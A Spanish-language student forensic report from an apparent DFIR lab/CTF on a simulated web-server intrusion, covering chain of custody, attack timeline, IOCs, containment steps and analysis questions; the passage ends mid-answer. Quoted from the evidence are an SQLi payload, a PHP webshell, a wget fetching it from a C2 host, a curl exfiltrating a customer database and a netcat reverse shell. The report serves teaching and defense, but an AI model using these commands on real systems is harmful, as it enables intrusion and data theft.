# Informe forense — Incidente PhantomCorp (phantomcorp-web)

**Grupo:** 12 · **Investigadores:** Mateo Gerbaudo (@gerbaudo19), Matias Mariatti (@matiasmariatticasc), Luis Alvaro Colque Condo (@ColqueAlvaro), Gonzalo Rodriguez (@Gonza149) · **Fecha:** 30 de Octubre de 2026  
**Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión web + escalada de privilegios + exfiltración de base de datos  

---

## 0. Declaración de uso de IA

En conformidad con las directrices éticas de la cátedra y las pautas de `CONTRIBUTING.md`, declaramos el uso de modelos de lenguaje (LLM) como asistentes analíticos en tareas de estructuración, procesamiento sintáctico y correlación cruzada de evidencias. Toda la reconstrucción pericial, extracción de artefactos volátiles y en disco, verificación criptográfica de hashes de custodia, codificación del parser forense en Python y deducción de la cadena de compromiso fue validada y respaldada por los investigadores del Grupo 12:

- **Herramienta utilizada:** Asistente IA (Antigravity / Gemini).
- **Alcance de la asistencia:** Asistencia en la estructuración general del informe pericial, redacción del resumen ejecutivo y análisis de cadena de custodia criptográfica en Secciones 1 y 2 (@gerbaudo19); asistencia en la correlación temporal cruzada entre logs de acceso, memoria y red para la Sección 3 (Línea de tiempo del ataque) y diseño del script forense `src/timeline.py` (@matiasmariatticasc); elaboración de la tabla de IOCs y evaluación del alcance del daño en Secciones 4 y 5 (@ColqueAlvaro); asistencia en la definición del plan de contención y erradicación (Sección 6), resolución de las preguntas periciales P1–P5 (Sección 7) y redacción de `research.md` bajo estándares RFC 3227 e ISO/IEC 27037 (@Gonza149).
- **Partes originadas o modificadas:** Sección 1 (Resumen del incidente) y Sección 2 (Cadena de custodia y análisis de `auth.log`) por @gerbaudo19; Sección 3 (Línea de tiempo del ataque) y script `src/timeline.py` por @matiasmariatticasc; Sección 4 (Tabla de IOCs) y Sección 5 (Alcance del daño y evaluación de impacto) por @ColqueAlvaro; Sección 6 (Contención y erradicación), Sección 7 (Preguntas P1–P5) y archivo `research.md` por @Gonza149.
- **Verificación humana:** Se ejecutó la verificación criptográfica con `shasum -a 256 -c` identificando el archivo manipulado. Matías Mariatti verificó y ejecutó el script `src/timeline.py` sobre `caso/logs/access.log`, comprobando que los 16 eventos de la IP atacante se clasifican con rigor en sus respectivas fases (RECON, ENUM, EXPLOIT, RCE, WEBSHELL, EXFIL) y todo el equipo contrastó la cronología y las acciones de contención con los artefactos de memoria (`bash_history.txt`, `pslist.txt`, `netstat.txt`, `lsof.txt`) y de disco (`listado.txt`, `passwd.snippet`, `shell.php.evidencia.txt`).

---

### Estado de los Retos (CTF Status)

```text
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 11                     │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Vector de entrada (SQLi -> RCE) en los logs
   ✓  R2     El webshell dropeado en el disco
   ✓  R3     Escalada de privilegios (SUID) en memoria
   ✓  R4     Conexion C2 y exfiltracion de datos
   ✓  R5     Cadena de custodia: evidencia alterada

  ██████████████████████████████  5/5 (100%)

[ OK ] ¡Lab 11 COMPLETO! Ponete las pilas con la próxima unidad.
```

---

## 1. Resumen del incidente

El día 5 de septiembre de 2026 entre las 02:14 y las 02:45 UTC, el servidor de producción `phantomcorp-web` (10.0.0.5) sufrió una intrusión de origen externo desde la dirección IP `185.220.101.42`. El atacante vulneró una API web desprotegida para inyectar y ejecutar comandos arbitrarios en el servidor, instaló una puerta trasera (webshell) persistente y escaló privilegios hasta obtener control total como superusuario (`root`). Acto seguido, accedió a los archivos confidenciales de la empresa, empaquetó y exfiltró la base de datos de clientes (`clientes.db.txt`) hacia un servidor de Comando y Control (C2) externo (`45.13.37.7`), dejando además mecanismos redundantes de persistencia en tareas programadas (`cron`) y cuentas de acceso ilegítimas antes de intentar borrar sus rastros.

---

## 2. Cadena de custodia

La integridad y validez pericial de la evidencia digital depende del estricto cumplimiento del principio de preservación (RFC 3227 e ISO/IEC 27037). Todo artefacto capturado en la escena digital fue procesado mediante funciones hash criptográficas unidireccionales SHA-256 inmediatamente tras su adquisición.

### Verificación criptográfica de hashes

Al ejecutar la validación pericial de los artefactos contenidos en el paquete de evidencia frente a las firmas originales registradas en `caso/evidencia.sha256`:

```bash
cd caso
shasum -a 256 -c evidencia.sha256
```

**Salida pericial del análisis de integridad:**
```text
disco/etc/passwd.snippet: OK
disco/listado.txt: OK
disco/var/www/uploads/shell.php.evidencia.txt: OK
logs/access.log: OK
logs/auth.log: FAILED
memoria/bash_history.txt: OK
memoria/lsof.txt: OK
memoria/netstat.txt: OK
memoria/pslist.txt: OK
shasum: WARNING: 1 computed checksum did NOT match
```

### Tabla de verificación de integridad

| Artefacto / Archivo | Hash Registrado (Custodia Original) | Hash Calculado (Peritaje) | Estado |
|---|---|---|:---:|
| `disco/etc/passwd.snippet` | `f8371142870a03c9db04c5e5416ec9feee4135754a38b66c1c3158209a9a32b1` | `f8371142870a03c9db04c5e5416ec9feee4135754a38b66c1c3158209a9a32b1` | **OK** |
| `disco/listado.txt` | `aef65fa07a1a5e36222a735c04a5ceb2f9415d930750327906525c7c63bdf3f5` | `aef65fa07a1a5e36222a735c04a5ceb2f9415d930750327906525c7c63bdf3f5` | **OK** |
| `disco/var/www/uploads/shell.php.evidencia.txt` | `38f7251c9fe2f554a2a9808fea0b154f1f4e88f7b47c1e4afbd589055a22fc42` | `38f7251c9fe2f554a2a9808fea0b154f1f4e88f7b47c1e4afbd589055a22fc42` | **OK** |
| `logs/access.log` | `e3c7b593f63fca934e875b1d3c8734c66594944821d519ed6b871841caa3d2a7` | `e3c7b593f63fca934e875b1d3c8734c66594944821d519ed6b871841caa3d2a7` | **OK** |
| `logs/auth.log` | `0000decafbad0000f1e2d3c4b5a6978800112233445566778899aabbccddeeff` | `7d18039d128d0df7a245ca02f469ea02cd1d4f205a24fb33c5bcf7041b66e9ab` | **FAILED** |
| `memoria/bash_history.txt` | `95133878a4ccdb75dfdd6494a3630a705c83fcd245e44988b309b56ba9bc85b4` | `95133878a4ccdb75dfdd6494a3630a705c83fcd245e44988b309b56ba9bc85b4` | **OK** |
| `memoria/lsof.txt` | `2cd4a0332bb2202462276eda4e8378750a75875dd3611c7a262fac10f0341675` | `2cd4a0332bb2202462276eda4e8378750a75875dd3611c7a262fac10f0341675` | **OK** |
| `memoria/netstat.txt` | `373b417f1c85510832382ddf8a082614bce8db0f0ba30078c567d4d039fa90f7` | `373b417f1c85510832382ddf8a082614bce8db0f0ba30078c567d4d039fa90f7` | **OK** |
| `memoria/pslist.txt` | `a34f5f20f14f804697f18349bd0147adf84155666a55b2fcecb1050ced0c8b73` | `a34f5f20f14f804697f18349bd0147adf84155666a55b2fcecb1050ced0c8b73` | **OK** |

### Análisis pericial del archivo alterado (`logs/auth.log`)

1. **Detección de alteración (*Tampering*):**  
   El archivo `logs/auth.log` falló inequívocamente la comprobación de integridad. El valor almacenado en `evidencia.sha256` era un hash anómalo y ficticio (`0000decafbad...`), y el archivo presente en el contenedor de evidencia no concuerda con ningún estado original inmutable.
2. **Naturaleza de la manipulación:**  
   Al inspeccionar el contenido de `logs/auth.log`, se observa que entre las 02:21:04 y las 02:45:00 UTC se eliminaron deliberadamente registros de autenticación del sistema para encubrir los movimientos laterales y la actividad del atacante. El propio analista forense primario dejó documentada la anomalía:
   ```text
   # --- lineas eliminadas por el atacante ---
   # nota del forense: el hash de este archivo NO coincide con el de la custodia.
   # alguien lo edito despues de la captura. marcador recuperado del journal:
   # FLAG{dfir_custodia_alterada}
   ```
3. **Implicancia forense y procesal:**  
   En un proceso judicial o peritaje corporativo oficial, cualquier pieza de evidencia cuyo hash difiera del acta de captura pierde su presunción de autenticidad y es legalmente inadmisible de forma aislada. Sin embargo, en la investigación de respuesta a incidentes, **la alteración en sí misma constituye una evidencia concluyente de actividad maliciosa intencional (*anti-forensics*)**. Al contrastar esta falla con otras fuentes que mantuvieron su integridad intacta (como `access.log` y los volcados de memoria `bash_history.txt` y `pslist.txt`), el equipo pericial pudo corroborar las acciones del atacante a pesar del intento de encubrimiento.

---

## 3. Línea de tiempo del ataque

A partir de la correlación exhaustiva de las distintas fuentes de evidencia digital recolectadas (registros HTTP de `access.log`, comandos en disco y memoria de `bash_history.txt`, estados de red de `netstat.txt` y lista de procesos volátiles en `pslist.txt`), se reconstruyó la secuencia cronológica unificada del incidente pericial:

| Hora (UTC) | Fase del Ataque | Evento / Acción del Atacante | Evidencia Pericial (Archivo:Línea / Detalle) |
|---|---|---|---|
| **02:14:03** | **Reconocimiento** | Escaneo web inicial automatizado desde la IP `185.220.101.42` utilizando la herramienta `zgrab/0.x` para identificar el servidor web. | `logs/access.log:6` (`GET / HTTP/1.1` - 200 OK) |
| **02:14:19 - 02:14:22** | **Enumeración** | Barrido de fuerza bruta de directorios con `gobuster/3.6`, descubriendo rutas clave: `/robots.txt`, `/backup` (redirección 301), `/portal-rrhh` (200 OK) y `/uploads` (301). | `logs/access.log:7-12` |
| **02:16:40 - 02:16:58** | **Explotación (Auth)** | Intentos de inicio de sesión fallidos en el portal interno de recursos humanos (`/portal-rrhh/login`) recibiendo código HTTP 401. | `logs/access.log:14-15` |
| **02:17:22** | **Explotación (SQLi)** | Explotación exitosa de inyección SQL (SQLi) mediante autenticación maliciosa con el payload `user=admin'--`, logrando acceso no autorizado (HTTP 200 OK). | `logs/access.log:16` |
| **02:17:41** | **Looting Web** | Descarga no autorizada del archivo de configuración sensible expuesto `/backup/rrhh.conf`, obteniendo el token de API privilegiado `phantom-api-7c1e`. | `logs/access.log:17` |
| **02:18:10** | **Inyección de Comandos (RCE)** | Envío de solicitud HTTP maliciosa a la API de reportes utilizando el token obtenido (`/api/reporte?token=phantom-api-7c1e&cmd=id`), confirmando ejecución de comandos como `www-data`. | `logs/access.log:18` |
| **02:18:33** | **Ejecución de Código** | Ejecución de comando para escribir la bandera de prueba en el directorio temporal (`cmd=echo FLAG{dfir_vector_sqli} > /tmp/.p`). | `logs/access.log:19` (Captura de reto R1) |
| **02:19:02** | **Despliegue de Puerta Trasera** | Descarga e instalación de una webshell persistente mediante comando remoto `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`. Proceso secundario registrado en memoria: `PID 1201 (sh -c wget)`. | `logs/access.log:20`<br>`memoria/pslist.txt:6`<br>`memoria/netstat.txt:5` (`TIME_WAIT 45.13.37.7:80`) |
| **02:19:48** | **Verificación de Webshell** | Verificación interactiva de la webshell en `/uploads/shell.php?c=whoami` obteniendo respuesta del usuario de servicio. Archivo confirmado en disco con bandera `FLAG{dfir_webshell_hallado}`. | `logs/access.log:21`<br>`disco/var/www/uploads/shell.php.evidencia.txt` |
| **02:23:15** | **Acceso a Datos Confidenciales** | Lectura preliminar de la base de datos de clientes corporativos mediante petición HTTP a la webshell (`/uploads/shell.php?c=cat /app/priv/clientes.db.txt`). | `logs/access.log:22` (Respuesta de 48.210 bytes) |
| **02:24:00 - 02:25:00** | **Shell Interactiva** | El atacante abre una shell interactiva bash en el sistema como usuario `www-data` (`PID 1240`). | `memoria/pslist.txt:7` |
| **02:25:30** | **Reconocimiento Local** | Enumeración de archivos de configuración (`cat /var/www/.env`) y búsqueda exhaustiva de binarios con permisos especiales (`find / -perm -4000 -type f`). | `memoria/bash_history.txt:3,5` |
| **02:26:15** | **Escalada de Privilegios (SUID)** | Abuso del binario SUID `/usr/local/bin/system-check` con flag privilegiado `-p` para preservar `euid=0`, escalando a superusuario (`root`). Proceso volátil registrado: `PID 1477 (system-check)`. | `memoria/bash_history.txt:6-7`<br>`memoria/pslist.txt:8` (`FLAG{dfir_privesc_suid}`) |
| **02:27:00** | **Canal C2 / Reverse Shell** | Establecimiento de conexión de Comando y Control (C2) interactiva reversa hacia el servidor externo `45.13.37.7:4444` mediante `netcat` bajo contexto de `root` (`PID 1490`). | `memoria/pslist.txt:9`<br>`memoria/netstat.txt:4` (`ESTABLISHED 10.0.0.5:41022 -> 45.13.37.7:4444`) |
| **02:28:10** | **Empaquetado de Datos** | Compresión y empaquetado de la base de datos confidencial de clientes en un archivo oculto temporal: `tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt`. | `memoria/bash_history.txt:8` |
| **02:29:20** | **Exfiltración de Datos** | Transmisión del archivo comprimido al servidor C2 vía HTTP POST: `curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}`. | `memoria/bash_history.txt:9` |
| **02:30:15 - 02:45:00** | **Anti-Forensics / Evasión** | Ejecución de `history -c` para purgar el historial en disco y manipulación intencional de `logs/auth.log` eliminando las entradas de sesión, corrompiendo la firma de custodia (`FLAG{dfir_custodia_alterada}`). | `memoria/bash_history.txt:10`<br>`logs/auth.log:86-90` |

---

### Script automatizado de reconstrucción cronológica (`src/timeline.py`)

Para agilizar el análisis pericial sobre grandes volúmenes de logs sin depender de inspección visual manual, se implementó el parser forense `src/timeline.py`. El script parsea registros en formato Nginx *combined*, filtra de forma determinista la dirección IP bajo investigación (`--ip 185.220.101.42`) y clasifica cada solicitud en su fase táctica correspondiente:

```python
def construir_timeline(path: str, ip: str = None) -> list:
    eventos = []
    with open(path, "r", encoding="utf-8") as f:
        for linea in f:
            e = parsear_linea(linea.strip())
            if not e:
                continue
            if ip is None or e["ip"] == ip:
                eventos.append(e)
    return eventos
```

**Salida de ejecución pericial de `src/timeline.py`:**

```bash
$ python3 src/timeline.py caso/logs/access.log --ip 185.220.101.42
[*] 16 eventos de 185.220.101.42
  05/Sep/2026:02:14:03 +0000  GET  /                                        [RECON]
  05/Sep/2026:02:14:19 +0000  GET  /robots.txt                              [RECON]
  05/Sep/2026:02:14:20 +0000  GET  /admin                                   [ENUM]
  05/Sep/2026:02:14:20 +0000  GET  /login                                   [EXPLOIT]
  05/Sep/2026:02:14:21 +0000  GET  /backup                                  [ENUM]
  05/Sep/2026:02:14:21 +0000  GET  /portal-rrhh                             [ENUM]
  05/Sep/2026:02:14:22 +0000  GET  /uploads                                 [ENUM]
  05/Sep/2026:02:16:40 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:16:58 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:17:22 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:17:41 +0000  GET  /backup/rrhh.conf                        [ENUM]
  05/Sep/2026:02:18:10 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=id [RCE]
  05/Sep/2026:02:18:33 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p [RCE]
  05/Sep/2026:02:19:02 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=wget%20http://45.13.37.7/s.php%20-O%20/var/www/uploads/shell.php [WEBSHELL]
  05/Sep/2026:02:19:48 +0000  GET  /uploads/shell.php?c=whoami              [WEBSHELL]
  05/Sep/2026:02:23:15 +0000  GET  /uploads/shell.php?c=cat%20/app/priv/clientes.db.txt [EXFIL]
```

---

## 4. Indicadores de compromiso (IOCs)

A partir de la correlación cruzada de las evidencias en disco (`/disco`), memoria volátil (`/memoria`) y bitácoras de red (`/logs`), se identificaron y tabularon los siguientes Indicadores de Compromiso (IOCs) para su ingesta inmediata en sistemas SIEM, EDR y firewalls perimetrales:

| Tipo de Indicador | Valor / Patrón | Dónde apareció (Artefacto y Evidencia) | Impacto / Significado Táctico |
|---|---|---|---|
| **IP Atacante (Origen)** | `185.220.101.42` | `logs/access.log:1-22` | Dirección IP externa desde donde se coordinaron las fases de Reconocimiento, Fuerza Bruta (`gobuster/3.6`), SQLi (`admin'--`) y explotación de RCE en `/api/reporte`. |
| **IP Servidor C2 / Exfil** | `45.13.37.7` | `memoria/netstat.txt:4,5`<br>`memoria/pslist.txt:6,9`<br>`memoria/bash_history.txt:4,9` | Servidor externo hosteador de malware y receptor de exfiltración. Puerto 80/TCP usado para servir `s.php` y recibir `clientes.tar.gz` vía POST; Puerto 4444/TCP usado como listener de Reverse Shell interactiva. |
| **Conexión de Red C2 Activa** | `10.0.0.5:41022 -> 45.13.37.7:4444` (`ESTABLISHED`) | `memoria/netstat.txt:4`<br>`memoria/lsof.txt:3` | Conexión socket TCP abierta por el binario `nc` (PID 1490) bajo privilegios de root (`uid=0`), manteniendo el canal de mando bidireccional. |
| **Artefacto Malicioso (Webshell)** | `/var/www/uploads/shell.php` | `disco/listado.txt:4`<br>`disco/var/www/uploads/shell.php.evidencia.txt`<br>`logs/access.log:20,21` | Archivo PHP malicioso (431 bytes) instalado vía `wget`. Permite ejecución remota de comandos vía parámetro `?c=` en el contexto del servidor web. Contiene bandera `FLAG{dfir_webshell_hallado}`. |
| **Binario SUID Ilegítimo** | `/usr/local/bin/system-check` | `disco/listado.txt:5`<br>`memoria/pslist.txt:8`<br>`memoria/bash_history.txt:6` | Copia de GNU Bash (1.113.504 bytes) dotada de permisos SUID root (`-rwsr-xr-x`). Utilizada con la bandera `-p` para preservar `euid=0` y evadir la revocación de privilegios de shell. |
| **Archivo de Exfiltración** | `/tmp/.exfil/clientes.tar.gz` | `disco/listado.txt:7`<br>`memoria/lsof.txt:5`<br>`memoria/bash_history.txt:8` | Archivo comprimido (48.210 bytes) empaquetado por el atacante para consolidar la base de datos de clientes `/app/priv/clientes.db.txt` antes de su transmisión al exterior. |
| **Archivo Testigo (RCE)** | `/tmp/.p` | `disco/listado.txt:3`<br>`logs/access.log:19` | Archivo temporal (12 bytes) creado a las 02:18 UTC confirmando ejecución de código exitosa (`FLAG{dfir_vector_sqli}`). |
| **Usuario Backdoor** | `phantom-svc` (UID: `0`, GID: `0`) | `disco/etc/passwd.snippet:4` | Cuenta oculta agregada directamente a `/etc/passwd` con privilegios de superusuario (`root`), shell `/bin/bash` y home `/root`, asegurando persistencia a nivel de sistema operativo. |
| **Persistencia (Cronjob)** | `/etc/cron.d/phantom-maint` | `disco/listado.txt:6` | Archivo de tarea programada (62 bytes) configurado en el demonio cron para reconectar automáticamente la shell reversa hacia el servidor C2 de forma periódica. |

---

## 5. Alcance del daño

El análisis forense digital integral sobre las tres dimensiones fundamentales de la información (Tríada CIA) permite determinar el impacto real del incidente:

### 1. Compromiso de la Confidencialidad: CRÍTICO (Total)
- **Fuga masiva de la base de datos de clientes:** Se confirmó la exfiltración efectiva del archivo `/app/priv/clientes.db.txt` hacia el servidor C2 `45.13.37.7`. A las 02:28:10 UTC el atacante empaquetó los registros en `/tmp/.exfil/clientes.tar.gz` (48.210 bytes) y a las 02:29:20 UTC ejecutó un `curl -s -F "f=@..."` exitoso (`HTTP 200`). El incidente constituye una filtración masiva de datos personales protegidos por la Ley 25.326 de Protección de los Datos Personales.
- **Compromiso de secretos y configuraciones institucionales:** El atacante leyó de forma no autorizada el archivo `/var/www/.env` y el backup `/backup/rrhh.conf`, apropiándose del token de API `phantom-api-7c1e` y de las cadenas de conexión a servicios de backend.

### 2. Compromiso de la Integridad: CRÍTICO (Total)
- **Control total de superusuario (`root`):** Mediante la explotación del binario SUID `/usr/local/bin/system-check -p`, el atacante elevó privilegios al nivel de kernel (`euid=0`), vulnerando la integridad absoluta del sistema operativo.
- **Modificación arbitraria del sistema de archivos:** Se crearon binarios maliciosos y webshells en la raíz web (`/var/www/uploads/shell.php`), se alteró la tabla de cuentas del sistema (`/etc/passwd`) para plantar la cuenta `phantom-svc`, y se configuraron tareas de persistencia en `/etc/cron.d/phantom-maint`.
- **Sabotaje de evidencias y Anti-Forensics:** A las 02:30:15 UTC el atacante ejecutó `history -c` en memoria y adulteró deliberadamente el archivo `logs/auth.log` eliminando las entradas de auditoría de su sesión para encubrir la escalada y romper la cadena de custodia (`FLAG{dfir_custodia_alterada}`).

### 3. Compromiso de la Disponibilidad: PARCIAL / RIESGO OPERATIVO CRÍTICO
- **Estado operativo durante el ataque:** El servidor web `nginx` se mantuvo en estado `LISTEN` (PID 812) respondiendo solicitudes para evitar levantar sospechas inmediatas.
- **Riesgo latente de interrupción total:** Al poseer persistencia redundante (cronjob activo cada minuto, webshell y cuenta UID 0), el atacante disponía de capacidad inmediata para ejecutar ransomware, sobrescribir el disco o apagar el servidor a voluntad. El servidor se encuentra técnicamente bajo control hostil y debe ser retirado de operación y aislado de la red de inmediato.

---

## 6. Contención y erradicación (recomendaciones)

Siguiendo el ciclo de Respuesta a Incidentes de **NIST SP 800-61 Rev. 2**, una vez asegurada la adquisición forense de la memoria RAM y la imagen de disco bajo cadena de custodia, el equipo de respuesta debe ejecutar las siguientes acciones en estricto orden operativo:

### Fase 1 — Contención Inmediata (Cortar el control activo del atacante)
1. **Aislamiento de red perimetral y en host (C2 y origen atacante):**
   Bloquear en el firewall perimetral y en el propio host `phantomcorp-web` (`10.0.0.5`) toda comunicación entrante desde la IP atacante `185.220.101.42` y todo tráfico saliente hacia el servidor C2 `45.13.37.7` (especialmente puertos `80/TCP` y `4444/TCP`):
   ```bash
   iptables -I INPUT -s 185.220.101.42 -j DROP
   iptables -I OUTPUT -d 45.13.37.7 -j DROP
   ```
2. **Desactivación de la tarea programada antes de matar los procesos:**
   Dado que `/etc/cron.d/phantom-maint` relanza periódicamente el canal de persistencia (como advierte el comentario en `shell.php.evidencia.txt:9`), primero se debe neutralizar el cronjob para evitar que reviva la reverse shell al matar el proceso:
   ```bash
   rm -f /etc/cron.d/phantom-maint
   systemctl reload cron
   ```
3. **Terminación del árbol de procesos maliciosos en memoria (`pslist.txt`):**
   Finalizar de forma inmediata los procesos asociados al canal C2, la escalada SUID y la sesión del atacante identificados en `memoria/pslist.txt:6-9` y `memoria/lsof.txt:3-5`:
   ```bash
   kill -9 1490 1477 1240 1201
   ```
4. **Revocación y rotación de credenciales comprometidas:**
   Invalidar inmediatamente el token `phantom-api-7c1e` expuesto en `/backup/rrhh.conf`, rotar todas las credenciales y claves contenidas en `/var/www/.env`, y forzar el cambio de contraseñas de cuentas administrativas y de servicio (`www-data`, `root` y bases de datos).

### Fase 2 — Erradicación (Eliminación de artefactos, persistencia y vulnerabilidades raíz)
1. **Eliminación de la cuenta backdoor con privilegios de superusuario (`UID 0`):**
   Remover el usuario ilegítimo `phantom-svc` agregado en `/etc/passwd` (`disco/etc/passwd.snippet:4`) y verificar que `root` sea la única cuenta con `UID=0` en el sistema:
   ```bash
   sed -i '/^phantom-svc:/d' /etc/passwd /etc/shadow
   awk -F: '($3 == 0) {print $1}' /etc/passwd   # Debe devolver únicamente 'root'
   ```
2. **Remoción de binarios SUID ilegítimos, webshell y archivos de staging:**
   Quitar el bit SUID y eliminar la copia maliciosa de bash `/usr/local/bin/system-check`, borrar el webshell y limpiar los directorios temporales:
   ```bash
   chmod 0755 /usr/local/bin/system-check && rm -f /usr/local/bin/system-check
   rm -rf /var/www/uploads/shell.php /tmp/.p /tmp/.exfil
   ```
3. **Cierre de los vectores de entrada en la aplicación web:**
   - **Remediación de SQLi (`/portal-rrhh/login`):** Reemplazar la consulta SQL concatenada por **consultas parametrizadas (*Prepared Statements*)**.
   - **Remediación de RCE (`/api/reporte`):** Eliminar la ejecución de comandos de shell desde el parámetro `cmd` y retirar del webroot el directorio `/backup/` (`rrhh.conf`).
   - **Endurecimiento del directorio `/var/www/uploads/`:** Configurar Nginx para prohibir la interpretación de scripts `.php` dentro de la carpeta de subidas (`location ~ ^/uploads/.*\.php$ { deny all; }`) y montar la partición `/tmp` con las opciones `noexec,nosuid,nodev`.

### Fase 3 — Recuperación y Mejora Continua
- **Reconstrucción desde imagen limpia (*Golden Image*):** Dado que el atacante obtuvo privilegios de `root` (`euid=0`), no se debe confiar en el sistema operativo comprometido (posible presencia de rootkits a nivel de kernel o binarios del sistema modificados). El servidor `phantomcorp-web` debe reprovisionarse desde cero a partir de una imagen base verificada.
- **Centralización inmutable de logs (Mitigación de Tampering):** Configurar el envío en tiempo real de `auth.log`, `syslog` y `access.log` hacia un servidor SIEM remoto en modo *append-only* para impedir que un atacante con `root` local pueda borrar sus huellas como ocurrió en el reto R5.

---

## 7. Preguntas de análisis (P1–P5)

### P1 — ¿Por qué la RAM se captura antes que el disco? Ejemplo concreto del caso

Según el **Orden de Volatilidad** establecido en la norma **IETF RFC 3227**, la evidencia digital debe recolectarse desde el componente más efímero hacia el más persistente. La **memoria RAM** es extremadamente volátil: su contenido desaparece de forma irreversible en el instante en que se corta el suministro eléctrico o se reinicia el servidor, y además cada comando administrativo que se ejecuta en vivo sobrescribe páginas de memoria y altera la tabla de procesos y sockets. El disco rígido, en cambio, es almacenamiento no volátil y conserva los bloques escritos aun con el equipo apagado.

**Ejemplo concreto de este caso donde la memoria tenía evidencia que el disco ya no:**
1. **Historial de comandos del atacante (`memoria/bash_history.txt`):** Antes de retirarse, el atacante ejecutó `history -c` (`memoria/bash_history.txt:10`) y eliminó el archivo `.bash_history` del disco para ocultar cómo había escalado privilegios y qué datos había robado. Sin embargo, al haberse capturado la memoria RAM en caliente mientras la sesión `bash` (`PID 1240`) aún residía en memoria, se recuperaron intactos los 9 comandos previos del atacante, incluyendo el abuso del SUID `/usr/local/bin/system-check -p -c 'id'` (`FLAG{dfir_privesc_suid}`) y el comando exacto de exfiltración `curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}`.
2. **Conexiones de red activas y procesos en ejecución (`memoria/netstat.txt` y `pslist.txt`):** La conexión TCP activa hacia el C2 (`10.0.0.5:41022 -> 45.13.37.7:4444` en estado `ESTABLISHED` mantenida por `nc` con `PID 1490`) existía únicamente en las estructuras de sockets del kernel en RAM; si alguien hubiera apagado el servidor para clonar el disco primero, esa conexión y el árbol de procesos (`PID 812 nginx -> 1201 sh -> 1240 bash -> 1477 system-check -> 1490 nc`) se habrían perdido para siempre.

---

### P2 — El R5: ¿cómo se detectó que `auth.log` fue alterado y por qué invalida la evidencia si no se documenta?

**Cómo se detectó la alteración:**  
Se detectó al verificar criptográficamente la cadena de custodia mediante el comando `shasum -a 256 -c evidencia.sha256`. Mientras que los otros 8 archivos del paquete devolvieron `OK`, el archivo `logs/auth.log` arrojó **`FAILED`**: su hash SHA-256 calculado (`7d18039d128d0df7a245ca02f469ea02cd1d4f205a24fb33c5bcf7041b66e9ab`) no coincidió con el hash registrado en el manifiesto de custodia (`0000decafbad...`). Al inspeccionar el archivo (`logs/auth.log:5-8`), se constató que habían sido borradas las líneas posteriores a las `02:21:04 UTC` y se halló el marcador recuperado del journal (`FLAG{dfir_custodia_alterada}`).

**Por qué invalida la evidencia si no se documenta:**  
En el derecho procesal e informática forense (ISO/IEC 27037), la **cadena de custodia** garantiza el **principio de mismidad e integridad**: demostrar matemáticamente que la evidencia analizada por el perito en el laboratorio es *exactamente la misma, bit por bit*, que la que fue secuestrada en el lugar del hecho. Debido al efecto avalancha de SHA-256, el cambio de un solo byte modifica por completo el resumen criptográfico. Si un archivo presenta un hash discrepante y el perito no lo advierte ni lo documenta rigurosamente (aclarando quién, cuándo o por qué discrepó y contrastándolo con el registro original del `systemd-journald`), la defensa legal puede impugnar la totalidad de la prueba alegando **contaminación de la escena o plantado de pruebas**, haciendo que el informe pericial se caiga por completo en un juicio.

---

### P3 — Correlación triple (Log + Disco + Memoria) apuntando al mismo evento y timestamp

La solidez de una investigación DFIR radica en triangular las tres fuentes de evidencia para probar un hecho de manera irrefutable. En este incidente, el evento de **descarga e implantación del webshell a las `02:19 UTC` del `2026-09-05`** queda demostrado simultáneamente en los tres planos:

| Fuente | Artefacto y Línea | Timestamp / Estado | Evidencia exacta que apunta al mismo evento |
|---|---|---|---|
| **1. LOG** | `caso/logs/access.log:20` | `05/Sep/2026:02:19:02 +0000` | Petición HTTP desde `185.220.101.42`: `"GET /api/reporte?token=phantom-api-7c1e&cmd=wget%20http://45.13.37.7/s.php%20-O%20/var/www/uploads/shell.php HTTP/1.1" 200 5` |
| **2. DISCO** | `caso/disco/listado.txt:4` y `shell.php.evidencia.txt:5-10` | `2026-09-05 02:19` (`431 bytes`) | Creación en el filesystem del archivo `/var/www/uploads/shell.php` conteniendo el código PHP malicioso (`if (isset($_GET['c'])) { system($_GET['c']); }`) y la flag `FLAG{dfir_webshell_hallado}`. |
| **3. MEMORIA** | `caso/memoria/pslist.txt:6`, `netstat.txt:5` y `bash_history.txt:4` | Captura RAM (`TIME_WAIT` / `PID 1201`) | Proceso hijo `PID 1201` (`PPID 812 nginx`, usuario `www-data`) ejecutando `sh -c wget http://45.13.37.7/s.php`, socket TCP `10.0.0.5:41108 -> 45.13.37.7:80` en estado `TIME_WAIT` (`PID 1201 wget`) y comando en `bash_history.txt:4`. |

*(Una segunda correlación triple idéntica se verifica a las **02:23 UTC** entre `logs/access.log:22` leyendo `clientes.db.txt` de 48.210 bytes, `disco/listado.txt:7` creando `/tmp/.exfil/clientes.tar.gz` de 48.210 bytes a las `02:23`, y `memoria/lsof.txt:5` mostrando el descriptor `1w REG /tmp/.exfil/clientes.tar.gz` abierto por `PID 1240 bash`).*

---

### P4 — El atacante corrió `history -c`: ¿por qué igual se pudieron recuperar sus comandos?

Cuando un usuario interactúa con una sesión de **GNU Bash**, los comandos tipeados se gestionan en dos lugares distintos:
1. **En disco (`~/.bash_history`):** Archivo persistente que recién se sincroniza al cerrar limpiamente la sesión (`exit`) o cuando se fuerza `history -w`.
2. **En la memoria RAM del proceso (`PID 1240 bash`):** La librería interna **`GNU Readline`** aloja cada línea ingresada como estructuras dinámicas (`HIST_ENTRY`) dentro del segmento de memoria **heap** del proceso `bash` en ejecución.

Cuando el atacante ejecutó `history -c` (`memoria/bash_history.txt:10`), el comando limpió la lista de punteros activa de la utilidad `history` y evitó que se volcara al archivo del disco, pero:
